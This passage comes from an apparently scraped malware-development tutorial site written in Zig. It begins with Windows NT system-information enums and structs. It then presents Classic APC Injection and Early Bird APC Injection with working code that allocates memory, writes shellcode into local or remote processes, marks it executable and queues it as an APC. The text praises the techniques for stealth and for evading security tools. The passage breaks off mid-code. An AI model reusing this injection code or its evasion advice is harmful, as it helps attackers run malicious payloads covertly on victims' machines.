SystemLogicalProcessorAndGroupInformation, // q: SYSTEM_LOGICAL_PROCESSOR_INFORMATION_EX (EX in: LOGICAL_PROCESSOR_RELATIONSHIP RelationshipType) // since WIN7 // KeQueryLogicalProcessorRelationship\n    SystemProcessorCycleTimeInformation, // q: SYSTEM_PROCESSOR_CYCLE_TIME_INFORMATION[] (EX in: USHORT ProcessorGroup)\n    SystemStoreInformation, // q; s: SYSTEM_STORE_INFORMATION (requires SeProfileSingleProcessPrivilege) // SmQueryStoreInformation\n    SystemRegistryAppendString, // s: SYSTEM_REGISTRY_APPEND_STRING_PARAMETERS // 110\n    SystemAitSamplingValue, // s: ULONG (requires SeProfileSingleProcessPrivilege)\n    SystemVhdBootInformation, // q: SYSTEM_VHD_BOOT_INFORMATION\n    SystemCpuQuotaInformation, // q; s: PS_CPU_QUOTA_QUERY_INFORMATION\n    SystemNativeBasicInformation, // q: SYSTEM_BASIC_INFORMATION\n    SystemErrorPortTimeouts, // SYSTEM_ERROR_PORT_TIMEOUTS\n    SystemLowPriorityIoInformation, // q: SYSTEM_LOW_PRIORITY_IO_INFORMATION\n    SystemTpmBootEntropyInformation, // q: TPM_BOOT_ENTROPY_NT_RESULT // ExQueryTpmBootEntropyInformation\n    SystemVerifierCountersInformation, // q: SYSTEM_VERIFIER_COUNTERS_INFORMATION\n    SystemPagedPoolInformationEx, // q: SYSTEM_FILECACHE_INFORMATION; s (requires SeIncreaseQuotaPrivilege) (info for WorkingSetTypePagedPool)\n    SystemSystemPtesInformationEx, // q: SYSTEM_FILECACHE_INFORMATION; s (requires SeIncreaseQuotaPrivilege) (info for WorkingSetTypeSystemPtes) // 120\n    SystemNodeDistanceInformation, // q: USHORT[4*NumaNodes] // (EX in: USHORT NodeNumber)\n    SystemAcpiAuditInformation, // q: SYSTEM_ACPI_AUDIT_INFORMATION // HaliQuerySystemInformation -&gt; HalpAuditQueryResults, info class 26\n    SystemBasicPerformanceInformation, // q: SYSTEM_BASIC_PERFORMANCE_INFORMATION // name:wow64:whNtQuerySystemInformation_SystemBasicPerformanceInformation\n    SystemQueryPerformanceCounterInformation, // q: SYSTEM_QUERY_PERFORMANCE_COUNTER_INFORMATION // since WIN7 SP1\n    SystemSessionBigPoolInformation, // q: SYSTEM_SESSION_POOLTAG_INFORMATION // since WIN8\n    SystemBootGraphicsInformation, // q; s: SYSTEM_BOOT_GRAPHICS_INFORMATION (kernel-mode only)\n    SystemScrubPhysicalMemoryInformation, // q; s: MEMORY_SCRUB_INFORMATION\n    SystemBadPageInformation,\n    SystemProcessorProfileControlArea, // q; s: SYSTEM_PROCESSOR_PROFILE_CONTROL_AREA\n    SystemCombinePhysicalMemoryInformation, // s: MEMORY_COMBINE_INFORMATION, MEMORY_COMBINE_INFORMATION_EX, MEMORY_COMBINE_INFORMATION_EX2 // 130\n    SystemEntropyInterruptTimingInformation, // q; s: SYSTEM_ENTROPY_TIMING_INFORMATION\n    SystemConsoleInformation, // q; s: SYSTEM_CONSOLE_INFORMATION\n    SystemPlatformBinaryInformation, // q: SYSTEM_PLATFORM_BINARY_INFORMATION (requires SeTcbPrivilege)\n    SystemPolicyInformation, // q: SYSTEM_POLICY_INFORMATION (Warbird/Encrypt/Decrypt/Execute)\n    SystemHypervisorProcessorCountInformation, // q: SYSTEM_HYPERVISOR_PROCESSOR_COUNT_INFORMATION\n    SystemDeviceDataInformation, // q: SYSTEM_DEVICE_DATA_INFORMATION\n    SystemDeviceDataEnumerationInformation, // q: SYSTEM_DEVICE_DATA_INFORMATION\n    SystemMemoryTopologyInformation, // q: SYSTEM_MEMORY_TOPOLOGY_INFORMATION\n    SystemMemoryChannelInformation, // q: SYSTEM_MEMORY_CHANNEL_INFORMATION\n    SystemBootLogoInformation, // q: SYSTEM_BOOT_LOGO_INFORMATION // 140\n    SystemProcessorPerformanceInformationEx, // q: SYSTEM_PROCESSOR_PERFORMANCE_INFORMATION_EX // (EX in: USHORT ProcessorGroup) // since WINBLUE\n    SystemCriticalProcessErrorLogInformation,\n    SystemSecureBootPolicyInformation, // q: SYSTEM_SECUREBOOT_POLICY_INFORMATION\n    SystemPageFileInformationEx, // q: SYSTEM_PAGEFILE_INFORMATION_EX\n    SystemSecureBootInformation, // q: SYSTEM_SECUREBOOT_INFORMATION\n    SystemEntropyInterruptTimingRawInformation,\n    SystemPortableWorkspaceEfiLauncherInformation, // q: SYSTEM_PORTABLE_WORKSPACE_EFI_LAUNCHER_INFORMATION\n    SystemFullProcessInformation, // q: SYSTEM_PROCESS_INFORMATION with SYSTEM_PROCESS_INFORMATION_EXTENSION (requires admin)\n    SystemKernelDebuggerInformationEx, // q: SYSTEM_KERNEL_DEBUGGER_INFORMATION_EX\n    SystemBootMetadataInformation, // 150\n    SystemSoftRebootInformation, // q: ULONG\n    SystemElamCertificateInformation, // s: SYSTEM_ELAM_CERTIFICATE_INFORMATION\n    SystemOfflineDumpConfigInformation, // q: OFFLINE_CRASHDUMP_CONFIGURATION_TABLE_V2\n    SystemProcessorFeaturesInformation, // q: SYSTEM_PROCESSOR_FEATURES_INFORMATION\n    SystemRegistryReconciliationInformation, // s: NULL (requires admin) (flushes registry hives)\n    SystemEdidInformation, // q: SYSTEM_EDID_INFORMATION\n    SystemManufacturingInformation, // q: SYSTEM_MANUFACTURING_INFORMATION // since THRESHOLD\n    SystemEnergyEstimationConfigInformation, // q: SYSTEM_ENERGY_ESTIMATION_CONFIG_INFORMATION\n    SystemHypervisorDetailInformation, // q: SYSTEM_HYPERVISOR_DETAIL_INFORMATION\n    SystemProcessorCycleStatsInformation, // q: SYSTEM_PROCESSOR_CYCLE_STATS_INFORMATION (EX in: USHORT ProcessorGroup) // 160\n    SystemVmGenerationCountInformation,\n    SystemTrustedPlatformModuleInformation, // q: SYSTEM_TPM_INFORMATION\n    SystemKernelDebuggerFlags, // SYSTEM_KERNEL_DEBUGGER_FLAGS\n    SystemCodeIntegrityPolicyInformation, // q; s: SYSTEM_CODEINTEGRITYPOLICY_INFORMATION\n    SystemIsolatedUserModeInformation, // q: SYSTEM_ISOLATED_USER_MODE_INFORMATION\n    SystemHardwareSecurityTestInterfaceResultsInformation,\n    SystemSingleModuleInformation, // q: SYSTEM_SINGLE_MODULE_INFORMATION\n    SystemAllowedCpuSetsInformation,\n    SystemVsmProtectionInformation, // q: SYSTEM_VSM_PROTECTION_INFORMATION (previously SystemDmaProtectionInformation)\n    SystemInterruptCpuSetsInformation, // q: SYSTEM_INTERRUPT_CPU_SET_INFORMATION // 170\n    SystemSecureBootPolicyFullInformation, // q: SYSTEM_SECUREBOOT_POLICY_FULL_INFORMATION\n    SystemCodeIntegrityPolicyFullInformation,\n    SystemAffinitizedInterruptProcessorInformation, // (requires SeIncreaseBasePriorityPrivilege)\n    SystemRootSiloInformation, // q: SYSTEM_ROOT_SILO_INFORMATION\n    SystemCpuSetInformation, // q: SYSTEM_CPU_SET_INFORMATION // since THRESHOLD2\n    SystemCpuSetTagInformation, // q: SYSTEM_CPU_SET_TAG_INFORMATION\n    SystemWin32WerStartCallout,\n    SystemSecureKernelProfileInformation, // q: SYSTEM_SECURE_KERNEL_HYPERGUARD_PROFILE_INFORMATION\n    SystemCodeIntegrityPlatformManifestInformation, // q: SYSTEM_SECUREBOOT_PLATFORM_MANIFEST_INFORMATION // since REDSTONE\n    SystemInterruptSteeringInformation, // SYSTEM_INTERRUPT_STEERING_INFORMATION_INPUT // 180\n    SystemSupportedProcessorArchitectures, // p: in opt: HANDLE, out: SYSTEM_SUPPORTED_PROCESSOR_ARCHITECTURES_INFORMATION[] // NtQuerySystemInformationEx\n    SystemMemoryUsageInformation, // q: SYSTEM_MEMORY_USAGE_INFORMATION\n    SystemCodeIntegrityCertificateInformation, // q: SYSTEM_CODEINTEGRITY_CERTIFICATE_INFORMATION\n    SystemPhysicalMemoryInformation, // q: SYSTEM_PHYSICAL_MEMORY_INFORMATION // since REDSTONE2\n    SystemControlFlowTransition, // (Warbird/Encrypt/Decrypt/Execute)\n    SystemKernelDebuggingAllowed, // s: ULONG\n    SystemActivityModerationExeState, // SYSTEM_ACTIVITY_MODERATION_EXE_STATE\n    SystemActivityModerationUserSettings, // SYSTEM_ACTIVITY_MODERATION_USER_SETTINGS\n    SystemCodeIntegrityPoliciesFullInformation,\n    SystemCodeIntegrityUnlockInformation, // SYSTEM_CODEINTEGRITY_UNLOCK_INFORMATION // 190\n    SystemIntegrityQuotaInformation,\n    SystemFlushInformation, // q: SYSTEM_FLUSH_INFORMATION\n    SystemProcessorIdleMaskInformation, // q: ULONG_PTR[ActiveGroupCount] // since REDSTONE3\n    SystemSecureDumpEncryptionInformation,\n    SystemWriteConstraintInformation, // SYSTEM_WRITE_CONSTRAINT_INFORMATION\n    SystemKernelVaShadowInformation, // SYSTEM_KERNEL_VA_SHADOW_INFORMATION\n    SystemHypervisorSharedPageInformation, // SYSTEM_HYPERVISOR_SHARED_PAGE_INFORMATION // since REDSTONE4\n    SystemFirmwareBootPerformanceInformation,\n    SystemCodeIntegrityVerificationInformation, // SYSTEM_CODEINTEGRITYVERIFICATION_INFORMATION\n    SystemFirmwarePartitionInformation, // SYSTEM_FIRMWARE_PARTITION_INFORMATION // 200\n    SystemSpeculationControlInformation, // SYSTEM_SPECULATION_CONTROL_INFORMATION // (CVE-2017-5715) REDSTONE3 and above.\n    SystemDmaGuardPolicyInformation, // SYSTEM_DMA_GUARD_POLICY_INFORMATION\n    SystemEnclaveLaunchControlInformation, // SYSTEM_ENCLAVE_LAUNCH_CONTROL_INFORMATION\n    SystemWorkloadAllowedCpuSetsInformation, // SYSTEM_WORKLOAD_ALLOWED_CPU_SET_INFORMATION // since REDSTONE5\n    SystemCodeIntegrityUnlockModeInformation,\n    SystemLeapSecondInformation, // SYSTEM_LEAP_SECOND_INFORMATION\n    SystemFlags2Information, // q: SYSTEM_FLAGS_INFORMATION\n    SystemSecurityModelInformation, // SYSTEM_SECURITY_MODEL_INFORMATION // since 19H1\n    SystemCodeIntegritySyntheticCacheInformation,\n    SystemFeatureConfigurationInformation, // SYSTEM_FEATURE_CONFIGURATION_INFORMATION // since 20H1 // 210\n    SystemFeatureConfigurationSectionInformation, // SYSTEM_FEATURE_CONFIGURATION_SECTIONS_INFORMATION\n    SystemFeatureUsageSubscriptionInformation, // SYSTEM_FEATURE_USAGE_SUBSCRIPTION_DETAILS\n    SystemSecureSpeculationControlInformation, // SECURE_SPECULATION_CONTROL_INFORMATION\n    SystemSpacesBootInformation, // since 20H2\n    SystemFwRamdiskInformation, // SYSTEM_FIRMWARE_RAMDISK_INFORMATION\n    SystemWheaIpmiHardwareInformation,\n    SystemDifSetRuleClassInformation,\n    SystemDifClearRuleClassInformation,\n    SystemDifApplyPluginVerificationOnDriver,\n    SystemDifRemovePluginVerificationOnDriver, // 220\n    SystemShadowStackInformation, // SYSTEM_SHADOW_STACK_INFORMATION\n    SystemBuildVersionInformation, // SYSTEM_BUILD_VERSION_INFORMATION\n    SystemPoolLimitInformation, // SYSTEM_POOL_LIMIT_INFORMATION (requires SeIncreaseQuotaPrivilege)\n    SystemCodeIntegrityAddDynamicStore,\n    SystemCodeIntegrityClearDynamicStores,\n    SystemDifPoolTrackingInformation,\n    SystemPoolZeroingInformation, // SYSTEM_POOL_ZEROING_INFORMATION\n    SystemDpcWatchdogInformation,\n    SystemDpcWatchdogInformation2,\n    SystemSupportedProcessorArchitectures2, // q: in opt: HANDLE, out: SYSTEM_SUPPORTED_PROCESSOR_ARCHITECTURES_INFORMATION[] // NtQuerySystemInformationEx  // 230\n    SystemSingleProcessorRelationshipInformation, // q: SYSTEM_LOGICAL_PROCESSOR_INFORMATION_EX // (EX in: PROCESSOR_NUMBER Processor)\n    SystemXfgCheckFailureInformation,\n    SystemIommuStateInformation, // SYSTEM_IOMMU_STATE_INFORMATION // since 22H1\n    SystemHypervisorMinrootInformation, // SYSTEM_HYPERVISOR_MINROOT_INFORMATION\n    SystemHypervisorBootPagesInformation, // SYSTEM_HYPERVISOR_BOOT_PAGES_INFORMATION\n    SystemPointerAuthInformation, // SYSTEM_POINTER_AUTH_INFORMATION\n    SystemSecureKernelDebuggerInformation,\n    SystemOriginalImageFeatureInformation,\n    MaxSystemInfoClass,\n};\n\n// https://processhacker.sourceforge.io/doc/ntbasic_8h.html\npub const KPRIORITY = LONG;\n\n// https://doxygen.reactos.org/da/df4/struct__SYSTEM__PROCESS__INFORMATION.html\npub const SYSTEM_PROCESS_INFORMATION = extern struct {\n    NextEntryOffset: ULONG,\n    NumberOfThreads: ULONG,\n    WorkingSetPrivateSize: LARGE_INTEGER, // VISTA\n    HardFaultCount: ULONG, // WIN7\n    NumberOfThreadsHighWatermark: ULONG, // WIN7\n    CycleTime: ULONGLONG, // WIN7\n    CreateTime: LARGE_INTEGER,\n    UserTime: LARGE_INTEGER,\n    KernelTime: LARGE_INTEGER,\n    ImageName: UNICODE_STRING,\n    BasePriority: KPRIORITY,\n    UniqueProcessId: HANDLE,\n    InheritedFromUniqueProcessId: HANDLE,\n    HandleCount: ULONG,\n    SessionId: ULONG,\n    PageDirectoryBase: ULONG_PTR,\n\n    // VM_COUNTERS_EX part\n    // NOTE: *NOT* THE SAME AS VM_COUNTERS!\n    PeakVirtualSize: SIZE_T,\n    VirtualSize: SIZE_T,\n    PageFaultCount: ULONG,\n    PeakWorkingSetSize: SIZE_T,\n    WorkingSetSize: SIZE_T,\n    QuotaPeakPagedPoolUsage: SIZE_T,\n    QuotaPagedPoolUsage: SIZE_T,\n    QuotaPeakNonPagedPoolUsage: SIZE_T,\n    QuotaNonPagedPoolUsage: SIZE_T,\n    PagefileUsage: SIZE_T,\n    PeakPagefileUsage: SIZE_T,\n    PrivatePageCount: SIZE_T,\n\n    // IO_COUNTERS part\n    ReadOperationCount: LARGE_INTEGER,\n    WriteOperationCount: LARGE_INTEGER,\n    OtherOperationCount: LARGE_INTEGER,\n    ReadTransferCount: LARGE_INTEGER,\n    WriteTransferCount: LARGE_INTEGER,\n    OtherTransferCount: LARGE_INTEGER,\n    // SYSTEM_THREAD_INFORMATION TH[1]; - Usually accessed separately\n};\n\n// Pointer types (equivalent to your typedefs)\npub const PUNICODE_STRING = *UNICODE_STRING;\npub const PSYSTEM_PROCESS_INFORMATION = *SYSTEM_PROCESS_INFORMATION;\n\n// Export commonly used constants\npub const SystemProcessInformation = SYSTEM_INFORMATION_CLASS.SystemProcessInformation;\n</code></pre>"},{"location":"Advanced-Malware-Techniques/Process-Injection/APC-Injection/classic_apc_injection/","title":"Classic APC Injection","text":""},{"location":"Advanced-Malware-Techniques/Process-Injection/APC-Injection/classic_apc_injection/#tldr","title":"TL;DR","text":"<p>See the code example</p> <p>APC injection is a stealthy code injection technique that executes malicious payloads within legitimate Windows thread contexts. It leverages the built-in APC mechanism via <code>QueueUserAPC</code> to schedule shellcode execution without creating new processes, making detection difficult.</p> <p>The technique uses two approaches: alertable threads (using APIs like <code>SleepEx</code> with alertable flags for immediate execution) or suspended threads (created paused, then resumed after APC queuing). Our Zig implementation provides an interactive menu to choose between five alertable functions or suspended thread execution.</p> <p>This method's effectiveness comes from using legitimate Windows APIs and executing within existing thread contexts, avoiding the suspicious behavior of process creation while maintaining high reliability for covert operations.</p>"},{"location":"Advanced-Malware-Techniques/Process-Injection/APC-Injection/classic_apc_injection/#asynchronous-procedure-calls-apc","title":"Asynchronous Procedure Calls (APC)","text":"<p>Asynchronous procedure calls (APC) is a function that executes asynchronously in the context of a particular thread. When an APC is queued to a thread, the system issues a software interrupt. The next time the thread is scheduled, it will run the APC function. An APC generated by the system is called a kernel-mode APC. An APC generated by an application is called a user-mode APC. A thread must be in an alertable state to run a user-mode APC.</p> <p>To be more detailed, there're actually 4 types of APC on Windows, but here we'll focus on the user-mode APC.</p>"},{"location":"Advanced-Malware-Techniques/Process-Injection/APC-Injection/classic_apc_injection/#alertable-state","title":"Alertable State","text":"<p>Windows APC functions are put on a queue (FIFO). User-mode APC can only be called by the thread when the thread is in alertable state, but when once the APC is called, all of the functions in the APC queue will be executed by the thread.</p> <p>So, what is alertable state? It's actually the state that when a thread has no task to do (which is in a wait state). When a thread enter a alertable state, it will be placed in the queue of alertable threads, which allowed to run queued APC functions.</p>"},{"location":"Advanced-Malware-Techniques/Process-Injection/APC-Injection/classic_apc_injection/#apc-injection","title":"APC Injection","text":"<p>APC Injection is a code injection technique that leverages the Windows APC mechanism to execute malicious code in the context of another thread. This technique works by:</p> <ol> <li>Creating or targeting a thread - Either create a new thread in a suspended state or find an existing threads</li> <li>Injecting shellcode - Allocate memory and write the payload to the target process</li> <li>Queueing the APC - Use <code>QueueUserAPC</code> to schedule the shellcode execution</li> <li>Triggering execution - Either resume a suspended thread or wait for an alertable thread to process the APC<p>The main advantage of APC injection is that it executes code within the legitimate context of an existing thread, making it harder to detect than creating new threads or processes.</p> </li> </ol>"},{"location":"Advanced-Malware-Techniques/Process-Injection/APC-Injection/classic_apc_injection/#queueuserapc","title":"QueueUserAPC","text":"<p>The <code>QueueUserAPC</code> function is the core of APC injection. It adds a user-mode APC object to the APC queue of the specified thread.</p> <pre><code>extern \"kernel32\" fn QueueUserAPC(\n    pfnAPC: PAPCFUNC,           // Pointer to the APC function\n    hThread: HANDLE,            // Handle to the target thread\n    dwData: windows.ULONG_PTR,  // Parameter passed to APC function\n) callconv(WINAPI) BOOL;\n</code></pre> <p>Here's how we use it in our implementation:</p> <pre><code>// APC injection function\nfn runViaApcInjection(hThread: HANDLE, pPayload: []const u8) bool {\n    var dwOldProtection: DWORD = 0;\n\n    // Allocate memory for the payload\n    const pAddress = VirtualAlloc(null, pPayload.len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n    if (pAddress == null) {\n        print(\"\\t[!] VirtualAlloc Failed With Error : {}\\n\", .{GetLastError()});\n        return false;\n    }\n\n    // Copy payload to allocated memory\n    @memcpy(@as([*]u8, @ptrCast(pAddress))[0..pPayload.len], pPayload);\n\n    print(\"\\t[i] Payload Written To : 0x{X}\\n\", .{@intFromPtr(pAddress)});\n\n    // Change memory protection to executable\n    if (VirtualProtect(pAddress.?, pPayload.len, PAGE_EXECUTE_READWRITE, &amp;dwOldProtection) == 0) {\n        print(\"\\t[!] VirtualProtect Failed With Error : {}\\n\", .{GetLastError()});\n        return false;\n    }\n\n    waitForEnter(\"\\t[#] Press &lt;Enter&gt; To Run ... \");\n\n    // Queue the APC - this is where the magic happens!\n    if (QueueUserAPC(@ptrCast(pAddress), hThread, 0) == 0) {\n        print(\"\\t[!] QueueUserAPC Failed With Error : {}\\n\", .{GetLastError()});\n        return false;\n    }\n\n    return true;\n}\n</code></pre> <p>Key Points:</p> <ul> <li><code>pfnAPC</code> points to our shellcode (cast as a function pointer)</li> <li><code>hThread</code> is either a suspended thread or an alertable thread</li> <li><code>dwData</code> can pass parameters to the APC function (we use 0)</li> </ul>"},{"location":"Advanced-Malware-Techniques/Process-Injection/APC-Injection/classic_apc_injection/#put-a-thread-to-alertable-state","title":"Put A Thread To Alertable State","text":"<p>There are two main approaches to make APC injection work: using alertable threads or suspended threads.</p>"},{"location":"Advanced-Malware-Techniques/Process-Injection/APC-Injection/classic_apc_injection/#using-the-functions","title":"Using The Functions","text":"<p>Alertable threads are threads that call specific Windows API functions with the alertable flag set to TRUE. These functions will process queued APCs while waiting:</p>"},{"location":"Advanced-Malware-Techniques/Process-Injection/APC-Injection/classic_apc_injection/#method-1-sleepex","title":"Method 1: SleepEx","text":"<pre><code>fn alertableFunction1(lpParameter: LPVOID) callconv(WINAPI) DWORD {\n    _ = lpParameter;\n    _ = SleepEx(INFINITE, 1); // TRUE = 1, sleeps indefinitely in alertable state\n    return 0;\n}\n</code></pre>"},{"location":"Advanced-Malware-Techniques/Process-Injection/APC-Injection/classic_apc_injection/#method-2-waitforsingleobjectex","title":"Method 2: WaitForSingleObjectEx","text":"<pre><code>fn alertableFunction2(lpParameter: LPVOID) callconv(WINAPI) DWORD {\n    _ = lpParameter;\n\n    const hEvent = CreateEventW(null, 0, 0, null);\n    if (hEvent != null) {\n        _ = WaitForSingleObjectEx(hEvent.?, INFINITE, 1); // Alertable wait\n        _ = CloseHandle(hEvent.?);\n    }\n    return 0;\n}\n</code></pre>"},{"location":"Advanced-Malware-Techniques/Process-Injection/APC-Injection/classic_apc_injection/#method-3-waitformultipleobjectsex","title":"Method 3: WaitForMultipleObjectsEx","text":"<pre><code>fn alertableFunction3(lpParameter: LPVOID) callconv(WINAPI) DWORD {\n    _ = lpParameter;\n\n    const hEvent = CreateEventW(null, 0, 0, null);\n    if (hEvent != null) {\n        const handles = [_]HANDLE{hEvent.?};\n        _ = WaitForMultipleObjectsEx(1, &amp;handles, 1, INFINITE, 1); // Alertable wait\n        _ = CloseHandle(hEvent.?);\n    }\n    return 0;\n}\n</code></pre>"},{"location":"Advanced-Malware-Techniques/Process-Injection/APC-Injection/classic_apc_injection/#method-4-msgwaitformultipleobjectsex","title":"Method 4: MsgWaitForMultipleObjectsEx","text":"<pre><code>fn alertableFunction4(lpParameter: LPVOID) callconv(WINAPI) DWORD {\n    _ = lpParameter;\n\n    const hEvent = CreateEventW(null, 0, 0, null);\n    if (hEvent != null) {\n        const handles = [_]HANDLE{hEvent.?};\n        _ = MsgWaitForMultipleObjectsEx(1, &amp;handles, INFINITE, QS_KEY, MWMO_ALERTABLE);\n        _ = CloseHandle(hEvent.?);\n    }\n    return 0;\n}\n</code></pre>"},{"location":"Advanced-Malware-Techniques/Process-Injection/APC-Injection/classic_apc_injection/#method-5-signalobjectandwait","title":"Method 5: SignalObjectAndWait","text":"<pre><code>fn alertableFunction5(lpParameter: LPVOID) callconv(WINAPI) DWORD {\n    _ = lpParameter;\n\n    const hEvent1 = CreateEventW(null, 0, 0, null);\n    const hEvent2 = CreateEventW(null, 0, 0, null);\n\n    if (hEvent1 != null and hEvent2 != null) {\n        _ = SignalObjectAndWait(hEvent1.?, hEvent2.?, INFINITE, 1); // Alertable wait\n        _ = CloseHandle(hEvent1.?);\n        _ = CloseHandle(hEvent2.?);\n    }\n    return 0;\n}\n</code></pre>"},{"location":"Advanced-Malware-Techniques/Process-Injection/APC-Injection/classic_apc_injection/#create-an-alertable-thread","title":"Create An Alertable Thread","text":"<pre><code>// Create thread that immediately enters alertable state\nhThread = CreateThread(null, 0, alertableFunction1, null, 0, &amp;dwThreadId);\nif (hThread == null) {\n    print(\"[!] CreateThread Failed With Error : {}\\n\", .{GetLastError()});\n    return;\n}\nprint(\"[+] Alertable Target Thread Created With Id : {}\\n\", .{dwThreadId});\n</code></pre>"},{"location":"Advanced-Malware-Techniques/Process-Injection/APC-Injection/classic_apc_injection/#suspended-thread","title":"Suspended Thread","text":"<p>An alternative approach is to create a thread in a suspended state, queue the APC, then resume the thread:</p> <pre><code>// Dummy function for suspended thread\nfn dummyFunction(lpParameter: LPVOID) callconv(WINAPI) DWORD {\n    _ = lpParameter;\n\n    // Some dummy code that will never execute because APC hijacks it\n    var prng = std.Random.DefaultPrng.init(@intCast(std.time.timestamp()));\n    const random = prng.random();\n    const j = random.int(i32);\n    const i = j + random.int(i32);\n    _ = i;\n\n    return 0;\n}\n\n// Create suspended thread\nhThread = CreateThread(null, 0, dummyFunction, null, CREATE_SUSPENDED, &amp;dwThreadId);\nif (hThread == null) {\n    print(\"[!] CreateThread Failed With Error : {}\\n\", .{GetLastError()});\n    return;\n}\nprint(\"[+] Suspended Target Thread Created With Id : {}\\n\", .{dwThreadId});\n\n// Queue APC to suspended thread\nif (!runViaApcInjection(hThread.?, &amp;Payload)) {\n    return;\n}\n\n// Resume thread - this will execute the APC instead of the original function\nprint(\"[i] Resuming Suspended Thread...\", .{});\n_ = ResumeThread(hThread.?);\nprint(\"[+] DONE\\n\", .{});\n</code></pre>"},{"location":"Advanced-Malware-Techniques/Process-Injection/APC-Injection/classic_apc_injection/#key-differences","title":"Key Differences","text":"Aspect Alertable Thread Suspended Thread Execution Timing Immediate when APC is queued After thread is resumed Thread State Running, waiting in alertable state Suspended, not running Detection Risk Lower (thread appears to be waiting normally) Slightly higher (suspended threads are unusual) Reliability High (guaranteed to execute when queued) High (executes on resume) Use Case When you want immediate execution When you want to control timing"},{"location":"Advanced-Malware-Techniques/Process-Injection/APC-Injection/early_bird_apc_injection/","title":"Early Bird APC Injection","text":""},{"location":"Advanced-Malware-Techniques/Process-Injection/APC-Injection/early_bird_apc_injection/#tldr","title":"TL;DR","text":"<p>See the code example</p> <p>Early Bird APC injection is an advanced code injection technique that leverages the process creation lifecycle to execute malicious payloads before the main thread begins execution. This method creates a target process in a suspended or debugged state, injects shellcode, queues an APC to the main thread, and then resumes execution - causing the APC to execute immediately upon process startup.</p> <p>The technique's effectiveness lies in timing: by injecting during process initialization, it bypasses many runtime security measures and appears as legitimate process behavior. Our Zig implementation provides flexibility with two process creation methods (CREATE_SUSPENDED and DEBUG_PROCESS) and demonstrates cross-process memory injection combined with APC queuing.</p> <p>This approach is particularly stealthy because it executes within the context of a legitimate system process from its very first instruction, making detection extremely challenging for traditional security solutions.</p>"},{"location":"Advanced-Malware-Techniques/Process-Injection/APC-Injection/early_bird_apc_injection/#what-is-early-bird-apc-injection","title":"What is Early Bird APC Injection?","text":"<p>Early Bird APC injection is a sophisticated variant of standard APC injection that exploits the process creation and initialization timeline. Unlike traditional APC injection which targets existing threads, Early Bird injection creates a new process specifically for the purpose of code injection.</p> <p>The key insight is that when a process is created with the <code>CREATE_SUSPENDED</code> flag or in debug mode, the main thread exists but hasn't started executing the original program code yet. This creates a perfect window to:</p> <ol> <li>Inject malicious code into the process memory space</li> <li>Queue an APC to the main thread</li> <li>Resume execution - causing the APC to execute before any original code</li> </ol> <p>This timing makes the injection appear as if the malicious code is part of the original process initialization, making it extremely difficult to detect.</p>"},{"location":"Advanced-Malware-Techniques/Process-Injection/APC-Injection/early_bird_apc_injection/#process-creation-methods","title":"Process Creation Methods","text":"<p>Our implementation supports two different process creation methods, each with distinct advantages:</p>"},{"location":"Advanced-Malware-Techniques/Process-Injection/APC-Injection/early_bird_apc_injection/#using-create_suspended-flag","title":"Using CREATE_SUSPENDED Flag","text":"<pre><code>const CREATE_SUSPENDED = 0x00000004;\n\n// Create process in suspended state\nif (CreateProcessA(\n    null,\n    @constCast(formatted.ptr),\n    null,\n    null,\n    0,\n    CREATE_SUSPENDED,  // All threads start suspended\n    null,\n    null,\n    &amp;Si,\n    &amp;Pi,\n) == 0) {\n    // Handle error\n}\n</code></pre> <ul> <li>Clean and straightforward approach</li> <li>Process is truly suspended until resumed</li> <li>No debugging overhead</li> <li>Uses <code>ResumeThread</code> to continue execution</li> </ul>"},{"location":"Advanced-Malware-Techniques/Process-Injection/APC-Injection/early_bird_apc_injection/#using-debug_process-flag","title":"Using DEBUG_PROCESS Flag","text":"<pre><code>const DEBUG_PROCESS = 0x00000001;\n\n// Create process in debug mode\nif (CreateProcessA(\n    null,\n    @constCast(formatted.ptr),\n    null,\n    null,\n    0,\n    DEBUG_PROCESS,  // Process starts in debug mode\n    null,\n    null,\n    &amp;Si,\n    &amp;Pi,\n) == 0) {\n    // Handle error\n}\n</code></pre> <ul> <li>Process appears to be debugging session</li> <li>Can blend in with legitimate debugging activity</li> <li>Uses <code>DebugActiveProcessStop</code> to detach and continue</li> </ul>"},{"location":"Advanced-Malware-Techniques/Process-Injection/APC-Injection/early_bird_apc_injection/#cross-process-memory-injection","title":"Cross-Process Memory Injection","text":"<p>Early Bird injection requires writing shellcode into the target process's memory space using cross-process memory manipulation APIs:</p>"},{"location":"Advanced-Malware-Techniques/Process-Injection/APC-Injection/early_bird_apc_injection/#memory-allocation","title":"Memory Allocation","text":"<pre><code>fn injectShellcodeToRemoteProcess(\n    hProcess: windows.HANDLE,\n    pShellcode: []const u8,\n    ppAddress: *?*anyopaque,\n) bool {\n    // Allocate memory in target process\n    ppAddress.* = VirtualAllocEx(\n        hProcess,\n        null,\n        pShellcode.len,\n        MEM_COMMIT | MEM_RESERVE,\n        PAGE_READWRITE,\n    );\n\n    if (ppAddress.* == null) {\n        print(\"\\n\\t[!] VirtualAllocEx Failed With Error : {d} \\n\", .{windows.kernel32.GetLastError()});\n        return false;\n    }\n</code></pre> <p>Key Points:</p> <ul> <li><code>VirtualAllocEx</code> allocates memory in the target process</li> <li>Initially allocated with <code>PAGE_READWRITE</code> for writing</li> <li>Later changed to <code>PAGE_EXECUTE_READWRITE</code> for execution</li> </ul>"},{"location":"Advanced-Malware-Techniques/Process-Injection/APC-Injection/early_bird_apc_injection/#writing-shellcode","title":"Writing Shellcode","text":"<pre><code>// Write shellcode to allocated memory\nif (WriteProcessMemory(\n    hProcess,\n    ppAddress.*.?,\n    pShellcode.ptr,\n    pShellcode.len,\n    &amp;sNumberOfBytesWritten,\n) == 0 or sNumberOfBytesWritten != pShellcode.len) {\n    print(\"\\n\\t[!] WriteProcessMemory Failed With Error : {d} \\n\", .{windows.kernel32.GetLastError()});\n    return false;\n}\n</code></pre>"},{"location":"Advanced-Malware-Techniques/Process-Injection/APC-Injection/early_bird_apc_injection/#memory-protection","title":"Memory Protection","text":"<pre><code>// Change memory protection to executable\nif (VirtualProtectEx(\n    hProcess,\n    ppAddress.*.?,\n    pShellcode.len,\n    PAGE_EXECUTE_READWRITE,\n    &amp;dwOldProtection,\n) == 0) {\n    print(\"\\n\\t[!] VirtualProtectEx Failed With Error : {d} \\n\", .{windows.kernel32.GetLastError()});\n    return false;\n}\n</code></pre>"},{"location":"Advanced-Malware-Techniques/Process-Injection/APC-Injection/early_bird_apc_injection/#apc-queuing-and-execution","title":"APC Queuing and Execution","text":"<p>Once the shellcode is injected, we queue it as an APC to the main thread:</p> <pre><code>// Queue APC to the main thread\n_ = QueueUserAPC(\n    